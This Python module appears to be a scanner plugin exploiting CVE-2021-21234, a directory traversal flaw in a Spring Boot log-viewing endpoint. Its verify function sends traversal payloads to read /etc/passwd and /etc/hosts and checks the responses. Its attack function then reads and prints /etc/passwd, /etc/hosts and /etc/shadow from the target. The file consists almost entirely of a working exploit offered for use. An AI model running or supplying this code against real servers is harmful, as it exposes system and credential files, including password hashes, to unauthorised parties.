import requests, re
import urllib


def verify(url):
    relsult = {
        'name': 'Spring Boot 目录遍历 （CVE-2021-21234）',
        'vulnerable': False
    }
    try:
        payload1 = '/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../../../'
        payload2 = '/manage/log/view?filename=/etc/hosts&base=../../../../../../../../../../../../'
        vurl1 = urllib.parse.urljoin(url, payload1)
        vurl2 = urllib.parse.urljoin(url, payload2)
        rep1 = requests.get(vurl1, timeout=3)
        rep2 = requests.get(vurl2, timeout=3)
        if re.search('root:x:', rep1.text) and re.search('localhost', rep2.text):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['verify'] = payload1
            relsult['about'] = 'https://blog.csdn.net/ML_Team/article/details/121032049'
            relsult['attack'] = True
            return relsult
        else:
            return relsult
    except:
        return relsult


def attack(url):
    try:
        input_num = ''
        print('[*] 尝试读取/etc/passwd....')
        payload = '/manage/log/view?filename={0}&base=../../../../../../../../../../../../'
        print('[*] payload: {0}'.format(url + payload.format('/etc/passwd')))
        rep = requests.get(url + payload.format('/etc/passwd'), timeout=3)
        print(rep.text)
        print('[*] 尝试读取/etc/hosts....')
        print('[*] payload: {0}'.format(url + payload.format('/etc/hosts')))
        rep = requests.get(url + payload.format('/etc/hosts'), timeout=3)
        print(rep.text)
        print('[*] 尝试读取/etc/shadow....')
        print('[*] payload: {0}'.format(url + payload.format('/etc/shadow')))
        rep = requests.get(url + payload.format('/etc/shadow'), timeout=3)
        print(rep.text)

        return True
    except:
        return False